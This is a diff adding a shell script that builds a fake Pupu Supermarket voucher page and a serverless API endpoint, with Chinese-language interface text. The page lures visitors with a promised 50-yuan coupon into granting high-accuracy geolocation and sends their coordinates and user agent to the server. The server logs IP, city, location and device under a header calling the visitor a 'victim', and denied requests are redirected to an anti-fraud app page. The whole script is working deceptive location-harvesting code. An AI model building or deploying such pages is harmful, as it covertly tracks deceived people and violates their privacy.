@@ -1,0 +1,162 @@
+mkdir -p api
+
+# 创建 index.html
+cat << 'EOF' > index.html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>朴朴超市代金券查询</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            color: #333;
+        }
+        .card {
+            max-width: 380px;
+            margin: 50px auto;
+            background: #ffffff;
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+        }
+        .logo {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #2c2c2c;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        .btn {
+            background-color: #ff4d4f;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(255, 77, 79, 0.3);
+        }
+        .btn:active {
+            opacity: 0.85;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #888;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="logo">🥬</div>
+        <h2>朴朴超市专属代金券</h2>
+        <p>需要根据您所在城市查询最新优惠活动，请点击下方按钮并完成定位授权。</p>
+        
+        <button class="btn" onclick="checkLocation()">立即查询城市优惠</button>
+        <div id="status">正在请求定位...</div>
+    </div>
+
+    <script>
+        const antiFraudUrl = "https://apps.apple.com/cn/app/%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E4%B8%AD%E5%BF%83/id1552823102";
+
+        function checkLocation() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+
+            if (!navigator.geolocation) {
+                window.location.href = antiFraudUrl;
+                return;
+            }
+
+            statusDiv.innerHTML = "📍 请在上方弹出的窗口中点击<b>“允许”</b>...";
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+
+                    statusDiv.innerHTML = "✅ 定位成功，正在为您生成代金券...";
+
+                    try {
+                        await fetch('/api/save-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lon,
+                                accuracy: acc,
+                                ua: navigator.userAgent
+                            })
+                        });
+                    } catch (e) {
+                        console.log("发送失败");
+                    }
+
+                    setTimeout(() => {
+                        alert("恭喜！已为您匹配到 50 元城市专属无门槛代金券！");
+                    }, 500);
+                },
+                function(error) {
+                    statusDiv.innerHTML = "❌ 未能获取定位权限，狠心离开...";
+                    setTimeout(() => {
+                        window.location.href = antiFraudUrl;
+                    }, 800);
+                },
+                options
+            );
+        }
+    </script>
+</body>
+</html>
+EOF
+
+# 创建 api/save-location.js
+cat << 'EOF' > api/save-location.js
+export default async function handler(req, res) {
+  if (req.method === 'POST') {
+    try {
+      const { latitude, longitude, accuracy, ua } = req.body;
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+      const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '未知城市');
+      
+      console.log("=== 【朴朴代金券】捕获到受害者/用户定位 ===");
+      console.log(`IP: ${ip} | 城市: ${city}`);
+      console.log(`经纬度: 纬度 ${latitude} , 经度 ${longitude} (精度: ${accuracy}米)`);
+      console.log(`设备: ${ua}`);
+      console.log("==========================================");
+
+      return res.status(200).json({ success: true });
+    } catch (error) {
+      return res.status(500).json({ success: false });
+    }
+  }
+  res.status(405).end();
+}
+EOF
+
+echo "文件创建完成！"
